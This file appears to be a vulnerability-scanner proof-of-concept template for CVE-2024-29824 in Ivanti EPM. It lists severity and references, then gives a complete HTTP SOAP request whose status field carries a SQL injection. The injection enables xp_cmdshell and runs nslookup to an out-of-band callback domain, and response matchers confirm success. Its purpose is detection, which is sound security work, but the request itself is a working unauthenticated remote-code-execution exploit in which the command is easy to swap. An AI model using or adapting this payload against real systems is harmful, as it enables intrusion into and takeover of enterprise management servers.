cves/2024/CVE-2024-29824.poc

## id: CVE-2024-29824
## name: Ivanti EPM - Remote Code Execution
## author: hack007x
## severity: critical
## cve: CVE-2024-29824
## tags: cve,cve2024,ivanti,epm,sqli,rce,kev,vkev,vuln
## description: An unspecified SQL Injection vulnerability in Core server of Ivanti EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network to execute arbitrary code.
## affects: Apply security updates for Ivanti EPM that address CVE-2024-29824.
## cvss-score: 9.6
## reference: https://github.com/horizon3ai/CVE-2024-29824
## reference: https://nvd.nist.gov/vuln/detail/CVE-2024-29824
## reference: https://forums.ivanti.com/s/article/Security-Advisory-May-2024
## reference: https://www.horizon3.ai/attack-research/attack-blogs/cve-2024-29824-deep-dive-ivanti-epm-sql-injection-remote-code-execution-vulnerability/
## verification: true

POST /WSStatusEvents/EventHandler.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Content-Type: application/soap+xml

<?xml version="1.0" encoding="utf-8"?>
<soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
  <soap12:Body>
    <UpdateStatusEvents xmlns="http://tempuri.org/">
      <deviceID>string</deviceID>
      <actions>
        <Action name="string" code="0" date="0" type="96" user="string" configguid="string" location="string">
          <status>GoodApp=1|md5='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nslookup {{oob_domain}}'--</status>
        </Action>
      </actions>
    </UpdateStatusEvents>
  </soap12:Body>
</soap12:Envelope>

#@ oob: dns
#@ condition: and
#@ matcher: body contains "application/soap+xml"
#@ matcher: body contains "UpdateStatusEventsResponse"
#@ matcher: oob_received == true
#@ matcher: status_code == 200





# @VEIL-STAMP: 142af35e37339c324935ff757d22c50db0523ec56a10f815a7618cea2140b779
